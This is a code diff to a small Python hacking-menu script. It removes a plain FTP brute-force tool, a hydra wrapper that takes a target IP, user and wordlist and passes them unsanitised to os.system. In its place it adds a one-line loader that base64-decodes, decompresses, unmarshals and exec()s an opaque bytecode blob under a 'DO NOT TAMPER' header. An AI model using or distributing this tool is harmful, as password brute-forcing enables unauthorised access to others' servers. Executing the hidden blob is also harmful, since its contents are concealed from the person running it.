@@ -1,22 +1,3 @@
-# CREATED BY: RAMIZ UDDIN
-import os, time
-
-def tool_header(name):
-    os.system("clear")
-    print("\033[1;36m" + "="*45)
-    print(f"      {name.upper()}")
-    print("      CREATED BY: RAMIZ UDDIN")
-    print("="*45 + "\033[0m")
-
-# CREATED BY: RAMIZ UDDIN
-import os, cyber_deps
-cyber_deps.ensure_deps(system_pkgs=["hydra"])
-def run():
-    print("\033[1;32m[*] ", end=""); print("\n[*] FTP Brute Force")
-    t = input("Target IP: ")
-    if t=="99": import cyber_deps; cyber_deps.remove_deps(); return
-    u = input("User: ")
-    w = input("Wordlist: ") or "pass.txt"
-    os.system(f"hydra -l {u} -P {w} {t} ftp")
-    input("[Enter]")
-if __name__=="__main__": run()
+# ENCRYPTED BY: RAMIZ UDDIN ULTIMATE OBFUSCATOR
+# SOURCE PROTECTED. DO NOT TAMPER.
+import marshal,zlib,base64;exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJyVU0tv00AQ3rXXjyQlLaItgvLYtiBhoEApIBIeUp8oQlQlbnilyArJkkbETrR2gPpUwYFIXIoQohyQfOACv4CfEbWpiqzeOCBuCA5c2XWSEtRcWMm7s996vp3Z+eYraBuouf6y2PQG6ECH1wFtrJBCXdgPqPAPKlJxQUyqYMcYArp4GuooBjHQJeYnLci6HL8DQIb9vSANgfPNPzHIwzzUlO98M5uFbSQS+0Qez6cgnvT2QVLoeCM8D1ucaamF60JHVEyBpLKTpRVVFIx19kMdUekvmgeaPOtL2SLJUPfcQHr00tgF88r/DFfGwXAPNtbJ5PT4/PQUnrgbx8nxG4l7ODU1lZh1R/+LdSB9xtSQL5RsX7aXbIeYvlSmBcvxpUq5TKgGfWRlTGLzTLAP/IhTKhWNRZLJEUojoCEP+yqblsEWkl8kniWq+Trq30KhWvhwHWFmVGdWzr2Nv4q/vrxyqhYerKOh4FSro+OBcWADHfzF38mXFpdyNMMujTSCMcqP8na2vRShVvWjMKj+tjJ0pkRdjAm4HWuvi7izLhZIgab++hiu6OC6UNqdlDvpqE2Z7VzqNpfQhoZa6BV4rInlBO6rhy0xvd0ZyXCnm/RISogCvSslsnlXiqlOj44pHTPp/kdhPbNuJJDWWTN9/D6mnJ29pUisnNsb5tDM/ByeoBWH4JkSzRI3Mp+heeLgxFwc+0IsRnkLuXLKJjSO3fDtEs0VC7bDbLWcse1TzlPHDQU1wiNF7CI8Mod9yI2HTtlV0tOWQ+h9TaZKUM2CVa44fji79IBQI0fKth+hxCw9JsGG8k6h/LGZAqFDe7kPrPjwic1FxUUepOCLtGLRfYD3H9NaBTS0xoSz3xPW0PCHVO3ERP3o5Ja6q2quqweWx78oavXI8yfrPYObw7G14Vh9+NLnW/x48WX38jg3iuvqwKaqrbps21DtSmh1cHXP6pS32xO9Ue+mN+k5tejJOhrhCtY2UC/t4sGohmFmCpZhaEqQgI+cgkmCVmhkECGWXaHNFPc1XXgPGcZHEHA0slIvm6VcpUiu0sNsy+toX2TTDxFC+A10/0QSPPS7B8D+LyC8CfrXQL93zYutgZGfggL7fvQA1FW9ty7ufbfnfV9N3Bsw/wHU4x//'))))
